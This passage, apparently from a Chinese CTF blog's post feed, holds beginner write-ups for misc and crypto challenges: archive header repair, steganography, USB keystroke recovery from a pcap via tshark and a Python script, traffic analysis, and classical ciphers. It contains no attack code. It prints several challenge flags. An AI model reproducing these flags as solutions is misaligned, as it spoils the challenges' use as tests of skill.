src="https://img-blog.csdnimg.cn/20200716144455952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是没有得到flag——<code>fix the file and get the flag</code><br>然后看wp了解</p><blockquote><p>在文件头crc和位标记之间有一个74，这一位是固定的，但我们现在是7A</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200716144716839.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_FFFFFF,t_70" alt="m0re" loading="lazy"><br>改过之后在解压会失败，但是不妨碍查看<br><img src="https://img-blog.csdnimg.cn/20200716144857417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><h2 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h2><p>好久没做明文攻击的题了，我印象中好像也就做过一道，都快忘了。<br>现在以这个题复习一下。<br>既然要解压缩包，明文攻击肯定要有一个没密码的压缩包。只有图片里了，这个图片，foremost和binwalk都没有提取出来压缩包。<br><img src="https://img-blog.csdnimg.cn/20200710151053166.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>但是，能知道是有个zip压缩包的尾部，所以到010editor查看<br>发现最后部位的压缩包缺少个pk头部<code>504B</code><br><img src="https://img-blog.csdnimg.cn/20200710150841853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>补全头部，得到一个压缩包<br><img src="https://img-blog.csdnimg.cn/20200710151451472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>可以开始明文攻击了，但是好慢啊<br><img src="https://img-blog.csdnimg.cn/2020071015212829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>不解了，费劲。看wp去，<br><img src="https://img-blog.csdnimg.cn/20200716145921840.png" alt="m0re" loading="lazy"><br>这。。。。。。。。。。？？？？？？？？？？？？？？？？？？？？？<br>我修复了好多遍也没有得到答案。修复之后就没有文件了。（也可能是我的工具的问题）不管了<br>总之有点懵……<br><code>flag&#123;3te9_nbb_ahh8&#125;</code></p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>拼二维码<br>没什么意思，纯粹是拼，拼完扫二维码。</p><h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><p>一直解压，到<code>233.rar</code>winrar爆出了错误是文件头损坏<br><img src="https://img-blog.csdnimg.cn/20200716154642847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>修补一下，将<code>7A</code>改成<code>74</code><br><img src="https://img-blog.csdnimg.cn/2020071615482897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>就可以打开图片了。<br>然后使用stegsolve打开，在blue的最低位发现了一个二维码，扫描得到<br><code>ci&#123;v3erf_0tygidv2_fc0&#125;</code><br>然后看另一个文件，foremost或者binwalk分离得到一个流量包<br>得到<code>key.pcap</code>然后使用kali中的工具将keyboard data保存到file。<br>命令：<code>tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt</code><br>然后进行提取信息（使用python脚本，呃呃呃菜狗不会写，只能求助度娘）</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token comment">#python 2.7</span>mappings <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0x04</span><span class="token punctuation">:</span><span class="token string">"A"</span><span class="token punctuation">,</span>  <span class="token number">0x05</span><span class="token punctuation">:</span><span class="token string">"B"</span><span class="token punctuation">,</span>  <span class="token number">0x06</span><span class="token punctuation">:</span><span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">:</span><span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">:</span><span class="token string">"E"</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">:</span><span class="token string">"F"</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">:</span><span class="token string">"G"</span><span class="token punctuation">,</span>  <span class="token number">0x0B</span><span class="token punctuation">:</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">:</span><span class="token string">"I"</span><span class="token punctuation">,</span>  <span class="token number">0x0D</span><span class="token punctuation">:</span><span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">:</span><span class="token string">"K"</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">:</span><span class="token string">"L"</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">:</span><span class="token string">"M"</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">:</span><span class="token string">"N"</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">:</span><span class="token string">"O"</span><span class="token punctuation">,</span>  <span class="token number">0x13</span><span class="token punctuation">:</span><span class="token string">"P"</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">:</span><span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">:</span><span class="token string">"R"</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">:</span><span class="token string">"S"</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">:</span><span class="token string">"T"</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">:</span><span class="token string">"U"</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">:</span><span class="token string">"V"</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">:</span><span class="token string">"W"</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">:</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">:</span><span class="token string">"Y"</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">:</span><span class="token string">"Z"</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">:</span><span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">:</span><span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">:</span><span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">:</span><span class="token string">"5"</span><span class="token punctuation">,</span>  <span class="token number">0x23</span><span class="token punctuation">:</span><span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">:</span><span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">:</span><span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">:</span><span class="token string">"9"</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">:</span><span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">0x2a</span><span class="token punctuation">:</span><span class="token string">"[DEL]"</span><span class="token punctuation">,</span>  <span class="token number">0X2B</span><span class="token punctuation">:</span><span class="token string">"    "</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">:</span><span class="token string">" "</span><span class="token punctuation">,</span>  <span class="token number">0x2D</span><span class="token punctuation">:</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">:</span><span class="token string">"="</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">:</span><span class="token string">"["</span><span class="token punctuation">,</span>  <span class="token number">0x30</span><span class="token punctuation">:</span><span class="token string">"]"</span><span class="token punctuation">,</span>  <span class="token number">0x31</span><span class="token punctuation">:</span><span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">:</span><span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">:</span><span class="token string">";"</span><span class="token punctuation">,</span>  <span class="token number">0x34</span><span class="token punctuation">:</span><span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">:</span><span class="token string">","</span><span class="token punctuation">,</span>  <span class="token number">0x37</span><span class="token punctuation">:</span><span class="token string">"."</span> <span class="token punctuation">&#125;</span>nums <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>keys <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'usbdata.txt'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> keys<span class="token punctuation">:</span>    <span class="token keyword">if</span> line<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span> <span class="token keyword">or</span> line<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token string">'0'</span><span class="token punctuation">:</span>    <span class="token keyword">continue</span>    nums<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>line<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>keys<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>output <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> n <span class="token keyword">in</span> nums<span class="token punctuation">:</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token keyword">in</span> mappings<span class="token punctuation">:</span>        output <span class="token operator">+=</span> mappings<span class="token punctuation">[</span>n<span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        output <span class="token operator">+=</span> <span class="token string">'[unknown]'</span><span class="token keyword">print</span> <span class="token string">'output :\n'</span> <span class="token operator">+</span> output</code></pre><p>我吐了，搜的脚本都不管用，<br><img src="https://img-blog.csdnimg.cn/20200716161801900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>？？？？？output什么都没有，要不就是报错。表示无语=_=<br>改了快一个小时了，🈚🐔8️⃣🐟<br>key直接百度找了是<code>KEYXINAN</code><br>维吉尼亚解密：密码是XINAN<br><img src="https://img-blog.csdnimg.cn/20200716162614203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"><br>然后就是栅栏密码<br><img src="https://img-blog.csdnimg.cn/20200716162717758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_bTByZQ==,size_16,color_1FFFFF,t_70" alt="m0re" loading="lazy"></p><p>简单的Misc已经做得差不多了，以后写难度中等一点的，慢慢提升。</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF刷题记录————第五周</title>
      <link href="/posts/b009e283/"/>
      <url>/posts/b009e283/</url>
      
        <content type="html"><![CDATA[<p>前言：题目是做了之后的复现，所以没有顺序。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h2><p>与佛论禅解密网站直接解。之前还不能用来着，不知道怎么就突然好了，又可以用了。<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">与佛论禅</a></p><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><p>盲文对照，得到一窜字符<code>kmdonowg</code><br>解开压缩包，得到音频，听过后发现是摩尔斯电码，可以放在audacity查看。百度很多了，不想再多做一份了。<br>第二种方法，推荐一个好网站<a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?tdsourcetag=s_pcqq_aiomsg">在线解密摩尔斯电码</a><br><img src="https://img-blog.csdnimg.cn/20200411213245425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>属性，分离，都没有发现有效信息，放010Editor看看。看到不一样的地方。<br><img src="https://img-blog.csdnimg.cn/20200411214057322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到很熟悉的一道题，上周刚做过，只是当时学长给我们弄得简单了点。<br>那就还是Notepad++转换成坐标，再进行画图，<br><img src="https://img-blog.csdnimg.cn/20200411215038917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里再写一遍，我想试试扫描工具QR<br><img src="https://img-blog.csdnimg.cn/20200411215156830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>的确好用，哈哈。</p><h2 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h2><p>好用就再找个题玩玩<br><img src="https://img-blog.csdnimg.cn/2020041121591115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>？？？是不是试试就知道了。算了，我智障。<br>备注没有信息，foremost没有分出来任何东西。奇怪了。<br>可是在010Editor明明看到了有flag的word文档啊。<br><img src="https://img-blog.csdnimg.cn/20200411221704680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看过大佬的wp，发现还是提取，不过用binwalk就行，真奇怪<br><img src="https://img-blog.csdnimg.cn/20200411222654318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>成功提取到<br><img src="https://img-blog.csdnimg.cn/20200411223111929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>encode.txt那个base64解码得到<code>asdfghjkl1234567890</code>,可以解开一个压缩包，得到图片。表情包留下啦。哈哈。<br>再base64解密那个word文档。得到<code>comEON_YOuAreSOSoS0great</code>，耐心点，解好多遍才得到这个。<br>解开得到一个MP3文件，听出来是摩尔斯电码。在线解码。<br><img src="https://img-blog.csdnimg.cn/20200411224523666.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag就是M O R S E I S V E R Y V E R Y E A S Y<br>呃呃呃，大写好像不行，要小写。</p><h2 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h2><p><img src="https://img-blog.csdnimg.cn/20200411224955983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个刷新键，原本我不知道是F5来着，前几天刚好帮别人看了个作业就知道这个刷新键了。所以容易想到F5隐写<br>但是这个我没找到密码，所以直接试试<br>解出来是乱码，还是要密码。回头看压缩包中有没有信息，也没有。<br>好像忽略了一个东西。还有个文件夹呢，那个刚开始里面图片打不开我就没管它了，可能在这里面。<br>实在找不到了，，就看大佬的wp了。偷偷瞟一眼。<br>服啦，一直在走弯道。的确是没密码的，只是，，，，<br><img src="https://img-blog.csdnimg.cn/20200411230817470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>压缩包的文件头。害，没想到。<br>继续做， 打开发现还有加密，应该是伪加密，看一下，改了。<br><img src="https://img-blog.csdnimg.cn/20200411231059298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>呜呜呜，看到了。又了解到一种新姿势。</p><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><p><img src="https://img-blog.csdnimg.cn/20200411232807446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>下载后看到后缀是pcapng，应该是流量分析的题。<br>打开后，直接追踪流0，<br><img src="https://img-blog.csdnimg.cn/20200411233035359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了账号密码。串在一起，MD5解密。这个网站有点抽风。害。<br><img src="https://img-blog.csdnimg.cn/20200411232713832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h2><p>流量分析题，这道题做了一个多小时，做出来哈哈。反正就是做出来了。贼棒。流量分析追踪流发现这个，<br><img src="https://img-blog.csdnimg.cn/20200412005807510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>有压缩包。那就分离一下，foremost分离得到压缩包。有密码。首先查看不是伪加密，那就还有密码。在到处看信息无果后，还是接着追踪信息流。<br>流7<br>发现了这么一大片十六进制的数字，开头还是FFD8，这样应该是jpg图片。<br><img src="https://img-blog.csdnimg.cn/20200412005202847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>那就复制下来放HxD里。<br><img src="https://img-blog.csdnimg.cn/20200412010338956.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>保存为jpg图片。<br>得到密码<br><img src="https://img-blog.csdnimg.cn/20200412010521214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="世上无难事"><a href="#世上无难事" class="headerlink" title="世上无难事"></a>世上无难事</h2><p><img src="https://img-blog.csdnimg.cn/2020041317523769.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>密文非常乱，看不出来什么，看提示，<code>毫无规律</code>、<code>还原成通顺的语句</code>。<br>想到替换密码，在线网站解密，爆破<br><img src="https://img-blog.csdnimg.cn/20200413175546296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>题中说key就是密码，直接交，但是不对。原本思路是32位，试了下MD5解密。无果。再看题，才发现了<code>小写字母</code>所以，试着把key中的大写字母改为小写字母。提交正确。</p><h2 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h2><p><img src="https://img-blog.csdnimg.cn/20200413175902986.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个没见过。不会，所以找一下别的师傅的wp，了解到一个新密码。<br><code>playfair</code>密码：普莱费尔密码（英文：Playfair cipher 或 Playfair square）是一种使用一个关键词方格来加密字符对的加密法，1854年由一位名叫查尔斯·惠斯通（Charles Wheatstone）的英国人发明。<br>算法：它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。<br>了解到这一步就行。有在线解密网站的。直接解密就可<br><img src="https://img-blog.csdnimg.cn/20200413184708870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不过解出来flag不对，跟那个师傅解出来的不一样，不知道为什么，我就试试人工智能解密法（手动）<br><img src="https://img-blog.csdnimg.cn/20200414074251741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>呃呃呃，横向纵向其实一样。但是我解出来也是这么个结果。<br>我对照其他博主写的刷题记录，答案这个不一样。不一样的地方在第三对和第八对还有第十一对。<br>百度百科</p><blockquote><p>1 若p1 p2在同一行，对应密文c1 c2分别是紧靠p1 p2 右端的字母。其中第一列被看做是最后一列的右方。如，按照前表，ct对应dc<br>2 若p1 p2在同一列，对应密文c1 c2分别是紧靠p1 p2 下方的字母。其中第一行被看做是最后一行的下方。<br>3 若p1 p2不在同一行，不在同一列，则c1 c2是由p1 p2确定的矩形的其他两角的字母（至于横向替换还是纵向替换要事先约好，或自行尝试）。如，按照前表，wh对应ku或uk。</p></blockquote><p>如果想要得出那样的答案。那么他是在同一行中向左看了一位，而不是向右。同一列中向上偏了一位。实则应该向下。<br>放弃这个答案。</p><h2 id="easy-crypto"><a href="#easy-crypto" class="headerlink" title="easy_crypto"></a>easy_crypto</h2><p><img src="https://img-blog.csdnimg.cn/20200414082104419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>bugku的一道题，做的时候，没想到是摩尔斯密码。当时就是各种进制转换。所以从一开始就错了，以至于没有解出。<br>看了其他师傅的wp，才知道是摩尔斯密码。<br><img src="https://img-blog.csdnimg.cn/20200414082943682.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>在线解密网站可解，解出答案后，大写全换成小写。</p><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>bugku的一道密码学的题。<br>看到之后，我能想到的几种密码，都过了一遍，不过好像没有匹配的。证明不是单个密码，这个时候再想是不是套密码了，再看看还是不会。看师傅们的博客去，瞄一眼，偷偷的。<br>原来是base64和凯撒。‘AA’很像‘==’这也行啊。好家伙，学到许多。<br>但是，大佬们都写的脚本。最近在学PHP，把要学python的事情落下了。基础是学的差不多了，要好好学怎么写脚本啦。先用下大佬的脚本，看看是怎么写的。  </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64strs <span class="token operator">=</span> <span class="token string">"e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA"</span><span class="token punctuation">;</span>offset <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>offset<span class="token punctuation">)</span>list_str<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i<span class="token punctuation">,</span>ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>strs<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token 